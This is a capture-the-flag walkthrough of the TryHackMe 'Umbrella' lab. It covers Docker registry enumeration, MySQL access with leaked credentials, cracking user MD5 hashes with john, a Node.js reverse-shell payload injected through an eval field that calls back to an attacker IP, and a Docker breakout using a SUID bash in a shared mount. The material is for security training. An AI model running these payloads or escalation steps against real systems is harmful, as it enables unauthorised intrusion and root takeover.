# Umbrella

**Room Link:** [https://tryhackme.com/r/room/umbrella](https://tryhackme.com/r/room/umbrella)



## **Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (996).png" alt=""><figcaption></figcaption></figure>



Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (997).png" alt=""><figcaption></figcaption></figure>



## **TCP/5000 - Docker Registry**

**List repositories**

**Kali**

```
curl -s http://$VICTIM:5000/v2/_catalog
```

<figure><img src="../../.gitbook/assets/image (998).png" alt=""><figcaption></figcaption></figure>

**Get tags of a repository**

**Kali**

```
curl -s http://$VICTIM:5000/v2/umbrella/timetracking/tags/list
```

<figure><img src="../../.gitbook/assets/image (999).png" alt=""><figcaption></figcaption></figure>

**Get manifests**

Inside the manifest we find potential credentials

**Kali**

```
curl -s http://$VICTIM:5000/v2/umbrella/timetracking/manifests/latest
```

<figure><img src="../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>

## **TCP/3306 - MySQL**

**Kali**

```
apt install mysql-client-core-5.7 
mysql -h $VICTIM -u root -p'Ng1-f3!Pe7-e5?Nf3xe5'
```

**Kali(mysql)**

```
show databases;
use timetracking;
show tables;
select * from users;
```

<figure><img src="../../.gitbook/assets/image (1001).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py  
python3 hash-id.py 2ac9cb7dc02b3c0083eb70898e549b63
```

<figure><img src="../../.gitbook/assets/image (1002).png" alt=""><figcaption></figcaption></figure>

**hash.txt**

```
claire-r:2ac9cb7dc02b3c0083eb70898e549b63
chris-r:0d107d09f5bbe40cade3de5c71e9e9b7
jill-v:d5c0607301ad5d5c1528962a83992ac8
barry-b:4a04890400b5d7bac101baace5d7e994
```

**Kali**

```
john --format=raw-md5 hash.txt 
john --format=raw-md5 hash.txt --show
```

<figure><img src="../../.gitbook/assets/image (1003).png" alt=""><figcaption></figcaption></figure>

**output**

```
claire-r:Password1
chris-r:letmein
jill-v:sunshine1
```



## **TCP/22 - SSH**

**Kali**

```
ssh claire-r@$VICTIM
Password: Password1 
```

<figure><img src="../../.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation&#x20;

In Claire's home directory we see the files that host the website. We can see the timeCalc uses the eval statement which is vulnerable.

**Victim**

```
cd /home/claire-r/timeTracker-src
cat app.js
```

<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

### **TCP/80:443 - HTTP(s)**

**Kali**

```
nc -lvnp 1337
```

**Login**

```
Username: claire-r
Password:Password1
```

<figure><img src="../../.gitbook/assets/image (1004).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1007).png" alt=""><figcaption></figcaption></figure>

**Payload**

```
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.10.245.149", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

<figure><img src="../../.gitbook/assets/image (1008).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

Full TTY Shell

```
script -qc /bin/bash /dev/null
ctrl + Z
stty raw -echo;fg
```

<figure><img src="../../.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

## Docker Breakout

**Exploit:** [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

### Privilege Escalation with 2 shells and host mount

If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder. You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.

**Victim(root)**

```
find / -name "tt.log"
cd /logs
cp /bin/bash . 
chown root:root bash
chmod 4777 bash
```

**Victim(claire-r)**

```
find / -name "tt.log"
cd /home/claire-r/timeTracker-src/logs
./bash -p 
```



<figure><img src="../../.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

